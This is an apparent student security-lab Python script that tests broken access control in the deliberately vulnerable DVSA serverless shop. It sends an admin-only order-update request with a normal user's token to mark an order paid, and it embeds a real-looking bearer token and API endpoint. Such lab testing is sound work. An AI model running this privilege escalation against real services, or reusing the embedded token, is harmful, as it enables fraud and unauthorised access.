import requests
import json

"""
ICS344 DVSA Security Project
Lesson 5 - Broken Access Control

This script tests whether a normal authenticated user can trigger an
administrative order update operation and change an order status without
administrator privileges.
"""

# ==========================================================
# 1) Configuration
# ==========================================================

# API Gateway endpoint for the DVSA order service
API_URL = "https://d0xsecb8a2.execute-api.us-east-1.amazonaws.com/dvsa/order"

# Paste User C authorization token here from browser DevTools
# IMPORTANT: use a normal user token, not an admin token
AUTH_TOKEN = "eyJraWQiOiIyRzFjaHhkWnRvdDV6SzR6cTVmUVwvVlNwWHVEVTEzcERLTjNMakUyK3p2VT0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJlNDQ4YzQ4OC1kMDgxLTcwNjItZDM2ZS02NTI1NzYzZDJkMjciLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9xZWtKUjhNbGgiLCJjbGllbnRfaWQiOiI2ZTVnZTBuYnE5NTNkcmJ0b3RrdHRjNWduYiIsIm9yaWdpbl9qdGkiOiJlYzc2Njc3MS02NTMxLTRkMzMtODBjOC1lMTdkNTdjYmNhNzEiLCJldmVudF9pZCI6ImNjYjRkZDljLTk4MmQtNDNiOS05MWVmLTI1NDU0M2ViN2VlZCIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NzcxMjE4MTYsImV4cCI6MTc3NzEyNTQxNiwiaWF0IjoxNzc3MTIxODE2LCJqdGkiOiJjOGQ2NGJiMy0wNGYyLTQ1MjAtYjJhNC1jMjQyNWEyNWEyNDYiLCJ1c2VybmFtZSI6ImU0NDhjNDg4LWQwODEtNzA2Mi1kMzZlLTY1MjU3NjNkMmQyNyJ9.bmkBShQUNnI3d9jEpzN5m12zfgb7w89c0C7hQlPwLGbJtRXvflkN6rtqqlcJvGgGL4fA2-8L5n5PvAY9eihkTlCz6s1OckYxJJNt106RA5QqHoOe3dDSR_SlFFt6sma5oXABDH34Lr-OUsA4GXOMtuAC-PVZ6EhhjxoxykiQlEkPNXB6KMaBRlTDWG3CKchuAZ2CIMhlLDcygI6GxMYB1oRL8DC9amLEyAoKJM_B6OtPpETho9528vhg51-vvEo2ySEnLM6jDgp3fGOPShDg_XOeGF1mHNuOBDIWP9fn5F-ib8eiS4Zq26uX4QCmg6awLL2gnXTXgHjM20m3CMTTHw"

# Order ID used for Lesson 5 test
ORDER_ID = "de2c6970-56fc-4b61-8cc5-ef2faf5f4060"


# ==========================================================
# 2) Build headers
# ==========================================================

headers = {
    "content-type": "application/json",
    "authorization": AUTH_TOKEN
}


# ==========================================================
# 3) Step A - Check current order status before exploit
# ==========================================================

check_payload = {
    "action": "orders"
}

print("=" * 70)
print("Lesson 5 - Broken Access Control Test")
print("=" * 70)
print("[1] Checking normal user orders before exploit...")
print("-" * 70)

try:
    check_response = requests.post(
        API_URL,
        headers=headers,
        json=check_payload,
        timeout=15
    )

    print("Status Code:", check_response.status_code)

    try:
        print(json.dumps(check_response.json(), indent=4))
    except json.JSONDecodeError:
        print(check_response.text)

except requests.exceptions.RequestException as error:
    print("[ERROR] Failed to check orders:")
    print(error)


# ==========================================================
# 4) Step B - Try to trigger admin update as normal user
# ==========================================================

exploit_payload = {
    "action": "admin-update-orders",
    "orderId": ORDER_ID,
    "status": "paid"
}

print("\n" + "=" * 70)
print("[2] Sending Broken Access Control exploit request...")
print("[*] Normal user is trying to call admin-update-orders")
print("[*] Target order:", ORDER_ID)
print("[*] Attempted new status: paid")
print("-" * 70)

try:
    exploit_response = requests.post(
        API_URL,
        headers=headers,
        json=exploit_payload,
        timeout=15
    )

    print("Status Code:", exploit_response.status_code)

    try:
        exploit_json = exploit_response.json()
        print(json.dumps(exploit_json, indent=4))
    except json.JSONDecodeError:
        print(exploit_response.text)

    print("-" * 70)

    response_text = exploit_response.text.lower()

    if exploit_response.status_code == 200 and "order updated" in response_text:
        print("[!] Broken Access Control confirmed.")
        print("[!] A normal user was able to trigger the admin update operation.")
        print("[!] Check DynamoDB to confirm that orderStatus changed to paid.")

    elif exploit_response.status_code in [401, 403] or "unauthorized" in response_text:
        print("[+] Access denied.")
        print("[+] The fix is working. Normal users cannot call admin-update-orders.")

    else:
        print("[*] Review the response above and verify the order status in DynamoDB.")

except requests.exceptions.RequestException as error:
    print("[ERROR] Exploit request failed:")
    print(error)


# ==========================================================
# 5) Step C - Check orders again after exploit attempt
# ==========================================================

print("\n" + "=" * 70)
print("[3] Checking orders again after exploit attempt...")
print("-" * 70)

try:
    final_response = requests.post(
        API_URL,
        headers=headers,
        json=check_payload,
        timeout=15
    )

    print("Status Code:", final_response.status_code)

    try:
        print(json.dumps(final_response.json(), indent=4))
    except json.JSONDecodeError:
        print(final_response.text)

except requests.exceptions.RequestException as error:
    print("[ERROR] Failed to check orders after exploit:")
    print(error)

print("=" * 70)
print("Test completed.")
print("=" * 70)